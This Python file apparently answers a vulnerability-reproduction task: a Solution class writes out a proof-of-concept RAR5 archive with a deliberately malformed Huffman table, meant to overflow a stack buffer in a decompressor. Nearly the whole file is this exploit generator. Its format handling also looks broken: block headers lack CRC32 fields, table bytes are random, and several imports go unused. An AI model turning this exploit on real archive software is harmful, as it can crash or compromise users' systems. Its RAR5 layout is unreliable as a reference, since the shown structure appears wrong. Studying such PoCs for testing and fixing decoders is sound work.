import os
import struct
import tempfile
import subprocess
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 signature (8 bytes)
        poc = bytearray()
        poc.extend(b'Rar!\x1a\x07\x01\x00')  # RAR5 signature
        
        # Archive header
        poc.extend(b'\x0e\x01\x00')  # Header size=14, type=1 (archive), flags=0
        
        # File header for a file with compressed data
        # We'll create a malformed Huffman table in the compressed data
        
        # Build the malicious compressed data
        compressed_data = self._build_malicious_compressed_data()
        
        # File header structure:
        # Header size (variable), type=2 (file), flags=0x03 (has_extra + has_data)
        # Then extra size, data size, file attributes, etc.
        
        # First, calculate sizes
        filename = b"poc.txt"
        extra_size = 0
        data_size = len(compressed_data)
        unpacked_size = 1000  # Arbitrary
        
        # Build file header
        header = bytearray()
        header.append(0x02)  # Header type = file
        
        # Flags: 0x03 = has_extra + has_data
        header.append(0x03)
        
        # Extra size (vint encoded 0)
        header.append(0x00)
        
        # Data size (vint encoded)
        data_size_bytes = self._encode_vint(data_size)
        header.extend(data_size_bytes)
        
        # File attributes (0)
        header.append(0x00)
        
        # Modification time (0)
        header.append(0x00)
        
        # Unpacked size (vint encoded)
        unpacked_size_bytes = self._encode_vint(unpacked_size)
        header.extend(unpacked_size_bytes)
        
        # Filename length + name
        header.append(len(filename))
        header.extend(filename)
        
        # Now build the complete block with header size
        block = bytearray()
        # Header size including the size field itself
        total_header_size = len(header) + 1  # +1 for the header size byte
        
        # Encode header size as vint
        header_size_bytes = self._encode_vint(total_header_size)
        block.extend(header_size_bytes)
        block.extend(header)
        
        # Add the malicious compressed data
        block.extend(compressed_data)
        
        poc.extend(block)
        
        # Add end of archive block
        poc.extend(b'\x03\x05\x00')
        
        return bytes(poc)
    
    def _encode_vint(self, value: int) -> bytes:
        """Encode integer as RAR5 variable-length integer"""
        result = bytearray()
        while value >= 0x80:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)
    
    def _build_malicious_compressed_data(self) -> bytes:
        """Build compressed data with malformed Huffman table"""
        # RAR5 compressed block format:
        # 1 byte: compression info (0x11 = version 1, method 1)
        # Then Huffman table data
        
        data = bytearray()
        
        # Compression info: version=1 (RAR5), method=1 (fastest)
        data.append(0x11)
        
        # Huffman table structure for RAR5:
        # The vulnerability is in the Huffman table decoding where
        # run-length encoding can cause buffer overflow
        
        # Create a malformed Huffman table with excessive run length
        # to overflow the stack buffer
        
        # Main Huffman table (for literals)
        # Using run-length encoding vulnerability
        
        # Start with some valid entries
        main_table = bytearray()
        
        # Add some normal bytes first
        for i in range(10):
            main_table.append(random.randint(1, 20))
        
        # Now the malicious part: create a long run that will overflow
        # when decoded
        main_table.append(0x00)  # RLE marker
        main_table.append(0xFF)  # Run length of 255
        
        # Add more zeros to ensure overflow
        for _ in range(200):
            main_table.append(0x00)
        
        # Add another RLE marker with large count
        main_table.append(0x00)
        main_table.append(0xFF)
        
        # Distance table (simplified)
        dist_table = bytearray()
        for i in range(20):
            dist_table.append(random.randint(1, 10))
        
        # Combine tables
        data.extend(main_table)
        data.extend(dist_table)
        
        # Add some compressed data (not important for the overflow)
        # Just enough to make the parser continue
        data.append(0x00)  # End of block marker
        
        return bytes(data)